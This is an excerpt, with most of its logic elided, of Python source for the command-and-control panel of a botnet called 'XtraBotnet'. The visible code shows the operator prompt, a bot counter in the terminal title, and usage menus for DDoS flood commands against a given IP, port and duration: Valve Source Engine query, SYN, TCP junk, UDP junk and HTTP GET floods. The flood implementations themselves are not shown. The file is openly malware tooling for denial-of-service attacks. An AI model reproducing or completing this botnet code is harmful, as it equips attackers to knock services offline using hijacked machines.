...
def update_title(client, username):
    ...
    while 1:
        try:
            send(client, f'\33]0;XtraBotnet | Bots: {len(bots)} | Connected as: {username}\a', False)
            time.sleep(2)
        except:
            client.close()
...
def command_line(client):
    ...
    prompt = f'{Fore.LIGHTBLUE_EX}XtraBotnet {Fore.LIGHTWHITE_EX}$ '
    ...
    while 1:
        try:
            ...
            if command == 'HELP':
                ...
                send(client, '| .vse    | UDP Valve Source Engine      |')
            ...
            # Valve Source Engine query flood
                ...
                if len(args) == 4:
                    ...
                    send(client, '')
                    send(client, '|----------------------------------|')
                    send(client, Fore.RESET + '|' + Fore.MAGENTA + ' Usage:' + Fore.RESET + ' | .vse [IP] [PORT] [TIME] |')
                    send(client, '|----------------------------------|')
                    send(client, '')
            ...
            # TCP SYNchronize flood           
                ...
                if len(args) == 4:
                    ...
                    send(client, '')
                    send(client, '|----------------------------------|')
                    send(client, Fore.RESET + '|' + Fore.MAGENTA + ' Usage:' + Fore.RESET + ' | .syn [IP] [PORT] [TIME] |')
                    send(client, '|----------------------------------|')
                    send(client, '')
            ...
            # TCP junk data packets flood
                ...
                if len(args) == 5:
                    ...
                    send(client, '')
                    send(client, '|-----------------------------------------|')
                    send(client, Fore.RESET + '|' + Fore.MAGENTA + ' Usage:' + Fore.RESET + ' | .tcp [IP] [PORT] [TIME] [SIZE] |')
                    send(client, '|-----------------------------------------|')
                    send(client, '')
            ...
            # UDP junk data packets flood
                ...
                if len(args) == 5:
                    ...
                    send(client, '')
                    send(client, '|-----------------------------------------|')
                    send(client, Fore.RESET + '|' + Fore.MAGENTA + ' Usage:' + Fore.RESET + ' | .udp [IP] [PORT] [TIME] [SIZE] |')
                    send(client, '|-----------------------------------------|')
                    send(client, '')
            ...
            # HTTP GET request flood
                ...
                if len(args) == 3:
                    ...
                    send(client, '')
                    send(client, '|----------------------------|')
                    send(client, Fore.RESET + '|' + Fore.MAGENTA + ' Usage:' + Fore.RESET + ' | .http [IP] [TIME] |')
                    send(client, '|----------------------------|')
                    send(client, '')
            else:
...
def handle_client(client, address):
    send(client, f'\33]0;XtraBotnet | Login\a', False)
